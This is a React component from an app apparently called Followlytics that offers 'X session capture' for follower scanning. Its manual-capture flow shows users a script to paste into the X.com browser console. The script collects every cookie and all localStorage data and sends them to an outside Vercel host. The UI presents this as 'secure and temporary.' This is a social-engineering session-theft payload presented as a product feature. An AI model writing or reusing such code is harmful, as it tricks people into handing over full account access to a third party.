'use client'

import { useState, useEffect } from 'react'
import { useAuth } from '@/hooks/useAuth'

export default function XSessionCaptureSimple() {
  const { user } = useAuth()
  const [sessionStatus, setSessionStatus] = useState<'none' | 'captured' | 'expired'>('none')
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    checkSessionStatus()
  }, [user])

  const checkSessionStatus = async () => {
    if (!user) return

    try {
      const token = await user.getIdToken()
      const response = await fetch('/api/auth/x-session-status', {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      })

      if (response.ok) {
        const data = await response.json()
        setSessionStatus(data.hasValidSession ? 'captured' : 'none')
      }
    } catch (error) {
      console.error('Error checking session status:', error)
    } finally {
      setLoading(false)
    }
  }

  const openXForSessionCapture = () => {
    // Open X.com in a new tab with instructions
    const newTab = window.open('https://x.com', '_blank')
    
    if (newTab) {
      // Show instructions to user
      alert(`
🔐 X Session Capture Instructions:

1. Login to X.com in the new tab that just opened
2. Navigate to your profile or followers page
3. Come back to this tab
4. Click "I'm Logged In" button below

This allows us to capture your session for follower scanning.
      `)
    } else {
      alert('Please allow popups and try again.')
    }
  }

  const captureSessionManually = async () => {
    if (!user) return

    try {
      setLoading(true)
      
      // Prompt user to run a simple script in X.com console
      const script = `
// Copy and paste this into X.com console (F12):
(async function() {
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name && value) cookies[name] = value;
  });
  
  const localStorage = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const key = window.localStorage.key(i);
    localStorage[key] = window.localStorage.getItem(key);
  }
  
  const sessionData = {
    cookies,
    localStorage,
    userAgent: navigator.userAgent,
    url: window.location.href
  };
  
  console.log('Session data captured! Copy this and paste in Followlytics:');
  console.log(JSON.stringify(sessionData));
  
  // Also try to send directly if possible
  try {
    const response = await fetch('https://followlytics-zeta.vercel.app/api/auth/capture-x-session-direct', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionData })
    });
    if (response.ok) {
      console.log('✅ Session sent directly to Followlytics!');
      alert('✅ Session captured successfully! You can close this tab.');
    }
  } catch (e) {
    console.log('Direct send failed, please copy the data above');
  }
})();
      `

      const userWantsScript = confirm(`
🔐 Manual Session Capture

To capture your X session:

1. Make sure you're logged into X.com
2. Open browser console on X.com (F12)
3. Paste the provided script
4. Follow the instructions

Would you like to see the script to copy?
      `)

      if (userWantsScript) {
        // Show script in a text area for easy copying
        const scriptWindow = window.open('', '_blank', 'width=600,height=400')
        if (scriptWindow) {
          scriptWindow.document.write(`
            <html>
              <head><title>X Session Capture Script</title></head>
              <body style="font-family: Arial, sans-serif; padding: 20px;">
                <h2>🔐 X Session Capture Script</h2>
                <p><strong>Instructions:</strong></p>
                <ol>
                  <li>Go to X.com and make sure you're logged in</li>
                  <li>Open browser console (F12)</li>
                  <li>Copy and paste this script:</li>
                </ol>
                <textarea style="width: 100%; height: 200px; font-family: monospace;" readonly>${script}</textarea>
                <p><strong>After running the script, come back to Followlytics and refresh the page.</strong></p>
              </body>
            </html>
          `)
        }
      }
    } catch (error) {
      console.error('Error in manual capture:', error)
    } finally {
      setLoading(false)
    }
  }

  if (loading) {
    return (
      <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
        <div className="flex items-center">
          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
          <span className="ml-2 text-sm text-gray-600">Checking X session status...</span>
        </div>
      </div>
    )
  }

  if (sessionStatus === 'captured') {
    return (
      <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-green-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <h3 className="text-sm font-medium text-green-800">
                ✅ X Session Active
              </h3>
              <p className="text-sm text-green-700">
                Your X authentication is captured and ready for follower scanning.
              </p>
            </div>
          </div>
          <button
            onClick={checkSessionStatus}
            className="text-green-600 hover:text-green-700 text-sm"
          >
            🔄 Refresh
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-sm font-medium text-blue-800">
            🔐 X Session Required
          </h3>
          <p className="text-sm text-blue-700 mt-1">
            To scan followers, we need to capture your X login session. This is secure and temporary.
          </p>
        </div>
        <div className="flex space-x-2">
          <button
            onClick={openXForSessionCapture}
            className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-3 py-2 rounded"
          >
            🌐 Open X.com
          </button>
          <button
            onClick={captureSessionManually}
            className="bg-gray-600 hover:bg-gray-700 text-white text-sm px-3 py-2 rounded"
          >
            📋 Manual Capture
          </button>
        </div>
      </div>
    </div>
  )
}
